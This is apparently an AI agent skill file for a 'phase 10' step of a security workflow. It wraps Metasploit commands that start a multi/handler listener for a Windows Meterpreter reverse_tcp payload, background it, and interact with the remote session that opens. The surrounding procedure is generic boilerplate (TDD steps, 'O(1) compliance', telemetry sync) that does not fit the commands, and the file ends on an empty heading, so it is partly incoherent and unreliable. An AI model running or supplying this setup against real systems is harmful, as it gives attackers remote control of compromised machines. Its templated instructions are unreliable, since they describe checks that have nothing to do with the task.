---
name: phase-10-setting-up-handlers
description: Use when executing phase 10 setting up handlers protocols within the security sector.
---

# Phase 10 Setting Up Handlers: Execution Protocol

## ⚙️ Overview
This protocol defines the exact standards for implementing Phase 10 Setting Up Handlers. By following this strict operational pattern, the engine guarantees deterministic execution, high performance, and complete adherence to all architectural guardrails established by the system design.

## 🛠️ Implementation SOP
Follow this step-by-step TDD procedure to execute the protocol:

- **Step 1: Baseline Context**: Verify the operational environment. Ensure required tools (like Python, Node, TS, or native CLI) are accessible before injecting new logic.
- **Step 2: Apply the Pattern**: Implement the core phase 10 setting up handlers logic directly into the active system context.
- **Step 3: Enforce Constraints**: Check for syntax errors, injection vulnerabilities, and performance bottlenecks (`O(1)` compliance).
- **Step 4: Execute Test Suite**: Run `npm run test` or the local testing framework to ensure the logic passes all regression checks.
- **Step 5: Document and Commit**: Update the session walkthrough and sync the telemetry logs for the security sector.

---

## 📚 Reference Material

# Phase 10: Setting Up Handlers

Configure listener for incoming connections:

```bash
# Manual handler setup
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j

# The -j flag runs as background job
msf6 > jobs -l

# When payload executes on target, session opens
[*] Meterpreter session 1 opened

# Interact with session
msf6 > sessions -i 1
```

## Quick Reference